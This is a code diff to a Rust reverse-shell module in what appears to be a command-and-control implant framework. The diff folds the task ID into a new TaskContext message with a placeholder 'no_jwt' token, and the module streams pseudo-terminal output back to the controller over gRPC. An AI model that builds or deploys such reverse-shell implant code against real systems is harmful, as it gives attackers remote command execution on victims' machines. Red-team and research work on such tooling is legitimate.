@@ -1,7 +1,7 @@
 use super::AsyncDispatcher;
 use anyhow::Result;
 use pb::{
-    c2::{ReverseShellMessageKind, ReverseShellRequest},
+    c2::{ReverseShellMessageKind, ReverseShellRequest, TaskContext},
     config::Config,
 };
 use portable_pty::{native_pty_system, CommandBuilder, PtySize};
@@ -37,7 +37,10 @@ impl AsyncDispatcher for ReverseShellPTYMessage {
         // First, send an initial registration message
         match output_tx
             .send(ReverseShellRequest {
-                task_id,
+                context: Some(TaskContext {
+                    task_id,
+                    jwt: "no_jwt".to_string(),
+                }),
                 kind: ReverseShellMessageKind::Ping.into(),
                 data: Vec::new(),
             })
@@ -130,9 +133,12 @@ impl AsyncDispatcher for ReverseShellPTYMessage {
                 // Send output to gRPC
                 match output_tx
                     .send(ReverseShellRequest {
+                        context: Some(TaskContext {
+                            task_id,
+                            jwt: "no_jwt".to_string(),
+                        }),
                         kind: ReverseShellMessageKind::Data.into(),
                         data: buffer[..n].to_vec(),
-                        task_id,
                     })
                     .await
                 {
@@ -151,9 +157,12 @@ impl AsyncDispatcher for ReverseShellPTYMessage {
                 // Send a ping to force the channel to be flushed
                 match output_tx
                     .send(ReverseShellRequest {
+                        context: Some(TaskContext {
+                            task_id,
+                            jwt: "no_jwt".to_string(),
+                        }),
                         kind: ReverseShellMessageKind::Ping.into(),
                         data: Vec::new(),
-                        task_id,
                     })
                     .await
                 {
